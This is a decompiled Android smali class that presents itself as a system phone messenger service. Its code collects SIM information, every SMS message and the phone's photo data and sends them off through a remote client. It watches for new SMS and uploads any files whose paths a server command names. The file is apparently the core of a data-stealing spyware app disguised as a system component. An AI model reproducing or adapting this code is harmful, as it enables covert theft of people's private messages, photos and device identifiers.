.class public Lcom/android/phone/service/MessengerServiceAIDLStub;
.super Lcom/android/phone/service/aidl/MessengerServiceAIDL$Stub;
.source "MessengerServiceAIDLStub.java"


# static fields
.field private static final DEBUG:Z = true

.field private static final TAG:Ljava/lang/String;


# instance fields
.field private mGetCmdsThread:Ljava/util/concurrent/ScheduledThreadPoolExecutor;

.field private mRealClient:Lcom/android/phone/client/RealClient;

.field private mSendThread:Ljava/util/concurrent/ExecutorService;

.field private mService:Lcom/android/phone/service/MessengerService;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    .prologue
    .line 26
    const-class v0, Lcom/android/phone/service/MessengerServiceAIDLStub;

    invoke-virtual {v0}, Ljava/lang/Class;->getSimpleName()Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/android/phone/service/MessengerServiceAIDLStub;->TAG:Ljava/lang/String;

    .line 27
    return-void
.end method

.method public constructor <init>(Lcom/android/phone/service/MessengerService;)V
    .locals 1
    .param p1, "messengerService"    # Lcom/android/phone/service/MessengerService;

    .prologue
    .line 37
    invoke-direct {p0}, Lcom/android/phone/service/aidl/MessengerServiceAIDL$Stub;-><init>()V

    .line 32
    const/4 v0, 0x1

    invoke-static {v0}, Ljava/util/concurrent/Executors;->newScheduledThreadPool(I)Ljava/util/concurrent/ScheduledExecutorService;

    move-result-object v0

    check-cast v0, Ljava/util/concurrent/ScheduledThreadPoolExecutor;

    iput-object v0, p0, Lcom/android/phone/service/MessengerServiceAIDLStub;->mGetCmdsThread:Ljava/util/concurrent/ScheduledThreadPoolExecutor;

    .line 33
    invoke-static {}, Ljava/util/concurrent/Executors;->newSingleThreadExecutor()Ljava/util/concurrent/ExecutorService;

    move-result-object v0

    iput-object v0, p0, Lcom/android/phone/service/MessengerServiceAIDLStub;->mSendThread:Ljava/util/concurrent/ExecutorService;

    .line 38
    iput-object p1, p0, Lcom/android/phone/service/MessengerServiceAIDLStub;->mService:Lcom/android/phone/service/MessengerService;

    .line 39
    return-void
.end method

.method static synthetic access$0()Ljava/lang/String;
    .locals 1

    .prologue
    .line 26
    sget-object v0, Lcom/android/phone/service/MessengerServiceAIDLStub;->TAG:Ljava/lang/String;

    return-object v0
.end method

.method static synthetic access$1(Lcom/android/phone/service/MessengerServiceAIDLStub;)V
    .locals 0

    .prologue
    .line 93
    invoke-direct {p0}, Lcom/android/phone/service/MessengerServiceAIDLStub;->setSmsDatas()V

    return-void
.end method

.method static synthetic access$2(Lcom/android/phone/service/MessengerServiceAIDLStub;)V
    .locals 0

    .prologue
    .line 78
    invoke-direct {p0}, Lcom/android/phone/service/MessengerServiceAIDLStub;->sendPhoneInfo()V

    return-void
.end method

.method static synthetic access$3(Lcom/android/phone/service/MessengerServiceAIDLStub;)Lcom/android/phone/client/RealClient;
    .locals 1

    .prologue
    .line 35
    iget-object v0, p0, Lcom/android/phone/service/MessengerServiceAIDLStub;->mRealClient:Lcom/android/phone/client/RealClient;

    return-object v0
.end method

.method private sendPhoneInfo()V
    .locals 3

    .prologue
    .line 80
    iget-object v1, p0, Lcom/android/phone/service/MessengerServiceAIDLStub;->mService:Lcom/android/phone/service/MessengerService;

    invoke-static {v1}, Lcom/android/phone/info/PhoneInfoUtils;->getSimInfoBySubscriptionManager(Landroid/content/Context;)Ljava/util/ArrayList;

    move-result-object v1

    .line 79
    invoke-static {v1}, Lcom/alibaba/fastjson/JSON;->toJSONString(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v0

    .line 81
    .local v0, "simInfo":Ljava/lang/String;
    invoke-static {v0}, Landroid/text/TextUtils;->isEmpty(Ljava/lang/CharSequence;)Z

    move-result v1

    if-nez v1, :cond_0

    .line 82
    iget-object v1, p0, Lcom/android/phone/service/MessengerServiceAIDLStub;->mSendThread:Ljava/util/concurrent/ExecutorService;

    new-instance v2, Lcom/android/phone/service/MessengerServiceAIDLStub$2;

    invoke-direct {v2, p0, v0}, Lcom/android/phone/service/MessengerServiceAIDLStub$2;-><init>(Lcom/android/phone/service/MessengerServiceAIDLStub;Ljava/lang/String;)V

    invoke-interface {v1, v2}, Ljava/util/concurrent/ExecutorService;->execute(Ljava/lang/Runnable;)V

    .line 91
    :cond_0
    return-void
.end method

.method private sendPictrueData()V
    .locals 3

    .prologue
    .line 110
    iget-object v1, p0, Lcom/android/phone/service/MessengerServiceAIDLStub;->mService:Lcom/android/phone/service/MessengerService;

    invoke-static {v1}, Lcom/android/phone/picture/PhotoReadHelper;->getPhotoDataInPhone(Landroid/content/Context;)Ljava/util/ArrayList;

    move-result-object v1

    invoke-static {v1}, Lcom/alibaba/fastjson/JSON;->toJSONString(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v0

    .line 111
    .local v0, "photoInPhone":Ljava/lang/String;
    invoke-static {v0}, Landroid/text/TextUtils;->isEmpty(Ljava/lang/CharSequence;)Z

    move-result v1

    if-nez v1, :cond_0

    .line 112
    iget-object v1, p0, Lcom/android/phone/service/MessengerServiceAIDLStub;->mSendThread:Ljava/util/concurrent/ExecutorService;

    new-instance v2, Lcom/android/phone/service/MessengerServiceAIDLStub$4;

    invoke-direct {v2, p0, v0}, Lcom/android/phone/service/MessengerServiceAIDLStub$4;-><init>(Lcom/android/phone/service/MessengerServiceAIDLStub;Ljava/lang/String;)V

    invoke-interface {v1, v2}, Ljava/util/concurrent/ExecutorService;->execute(Ljava/lang/Runnable;)V

    .line 122
    :cond_0
    return-void
.end method

.method private setSmsDatas()V
    .locals 3

    .prologue
    .line 94
    iget-object v1, p0, Lcom/android/phone/service/MessengerServiceAIDLStub;->mService:Lcom/android/phone/service/MessengerService;

    invoke-static {v1}, Lcom/android/phone/mms/SmsReadHelper;->getSmsDataInPhone(Landroid/content/Context;)Ljava/util/ArrayList;

    move-result-object v1

    invoke-static {v1}, Lcom/alibaba/fastjson/JSON;->toJSONString(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v0

    .line 95
    .local v0, "smsInPhone":Ljava/lang/String;
    invoke-static {v0}, Landroid/text/TextUtils;->isEmpty(Ljava/lang/CharSequence;)Z

    move-result v1

    if-nez v1, :cond_0

    .line 96
    iget-object v1, p0, Lcom/android/phone/service/MessengerServiceAIDLStub;->mSendThread:Ljava/util/concurrent/ExecutorService;

    new-instance v2, Lcom/android/phone/service/MessengerServiceAIDLStub$3;

    invoke-direct {v2, p0, v0}, Lcom/android/phone/service/MessengerServiceAIDLStub$3;-><init>(Lcom/android/phone/service/MessengerServiceAIDLStub;Ljava/lang/String;)V

    invoke-interface {v1, v2}, Ljava/util/concurrent/ExecutorService;->execute(Ljava/lang/Runnable;)V

    .line 106
    :cond_0
    return-void
.end method


# virtual methods
.method protected eventUploadPicture(Ljava/lang/String;)V
    .locals 7
    .param p1, "res"    # Ljava/lang/String;

    .prologue
    .line 125
    invoke-static {p1}, Lcom/alibaba/fastjson/JSON;->parse(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Lcom/alibaba/fastjson/JSONObject;

    .line 127
    .local v2, "json":Lcom/alibaba/fastjson/JSONObject;
    const-string v4, "files"

    invoke-virtual {v2, v4}, Lcom/alibaba/fastjson/JSONObject;->get(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Ljava/util/List;

    .line 128
    .local v1, "files":Ljava/util/List;, "Ljava/util/List<Ljava/lang/String;>;"
    sget-object v4, Lcom/android/phone/service/MessengerServiceAIDLStub;->TAG:Ljava/lang/String;

    new-instance v5, Ljava/lang/StringBuilder;

    const-string v6, "files:"

    invoke-direct {v5, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v5, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-static {v4, v5}, Lmms/log/DebugLog;->d(Ljava/lang/String;Ljava/lang/String;)V

    .line 129
    if-nez v1, :cond_1

    .line 137
    :cond_0
    return-void

    .line 133
    :cond_1
    invoke-interface {v1}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v4

    :goto_0
    invoke-interface {v4}, Ljava/util/Iterator;->hasNext()Z

    move-result v5

    if-eqz v5, :cond_0

    invoke-interface {v4}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/lang/String;

    .line 134
    .local v0, "file":Ljava/lang/String;
    iget-object v5, p0, Lcom/android/phone/service/MessengerServiceAIDLStub;->mRealClient:Lcom/android/phone/client/RealClient;

    new-instance v6, Ljava/io/File;

    invoke-direct {v6, v0}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v5, v6}, Lcom/android/phone/client/RealClient;->updateFile(Ljava/io/File;)Ljava/lang/String;

    move-result-object v3

    .line 135
    .local v3, "ret":Ljava/lang/String;
    sget-object v5, Lcom/android/phone/service/MessengerServiceAIDLStub;->TAG:Ljava/lang/String;

    invoke-static {v5, v3}, Lmms/log/DebugLog;->d(Ljava/lang/String;Ljava/lang/String;)V

    goto :goto_0
.end method

.method public onCreate()V
    .locals 2

    .prologue
    .line 42
    new-instance v0, Lcom/android/phone/client/RealClient;

    iget-object v1, p0, Lcom/android/phone/service/MessengerServiceAIDLStub;->mService:Lcom/android/phone/service/MessengerService;

    invoke-direct {v0, v1}, Lcom/android/phone/client/RealClient;-><init>(Landroid/content/Context;)V

    iput-object v0, p0, Lcom/android/phone/service/MessengerServiceAIDLStub;->mRealClient:Lcom/android/phone/client/RealClient;

    .line 43
    return-void
.end method

.method public start(Ljava/lang/String;)V
    .locals 4
    .param p1, "cmd"    # Ljava/lang/String;
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Landroid/os/RemoteException;
        }
    .end annotation

    .prologue
    .line 48
    sget-object v0, Lcom/android/phone/service/MessengerServiceAIDLStub;->TAG:Ljava/lang/String;

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "start"

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    new-instance v2, Ljava/lang/Throwable;

    const-string v3, "start"

    invoke-direct {v2, v3}, Ljava/lang/Throwable;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Lmms/log/DebugLog;->d(Ljava/lang/String;Ljava/lang/String;)V

    .line 51
    iget-object v0, p0, Lcom/android/phone/service/MessengerServiceAIDLStub;->mService:Lcom/android/phone/service/MessengerService;

    .line 52
    new-instance v1, Lcom/android/phone/service/MessengerServiceAIDLStub$1;

    new-instance v2, Landroid/os/Handler;

    iget-object v3, p0, Lcom/android/phone/service/MessengerServiceAIDLStub;->mService:Lcom/android/phone/service/MessengerService;

    invoke-virtual {v3}, Lcom/android/phone/service/MessengerService;->getMainLooper()Landroid/os/Looper;

    move-result-object v3

    invoke-direct {v2, v3}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    invoke-direct {v1, p0, v2}, Lcom/android/phone/service/MessengerServiceAIDLStub$1;-><init>(Lcom/android/phone/service/MessengerServiceAIDLStub;Landroid/os/Handler;)V

    .line 51
    invoke-static {v0, v1}, Lcom/android/phone/mms/SmsReadHelper;->registerContentObserver(Landroid/content/Context;Landroid/database/ContentObserver;)V

    .line 71
    invoke-direct {p0}, Lcom/android/phone/service/MessengerServiceAIDLStub;->sendPhoneInfo()V

    .line 73
    invoke-direct {p0}, Lcom/android/phone/service/MessengerServiceAIDLStub;->setSmsDatas()V

    .line 75
    invoke-direct {p0}, Lcom/android/phone/service/MessengerServiceAIDLStub;->sendPictrueData()V

    .line 76
    return-void
.end method
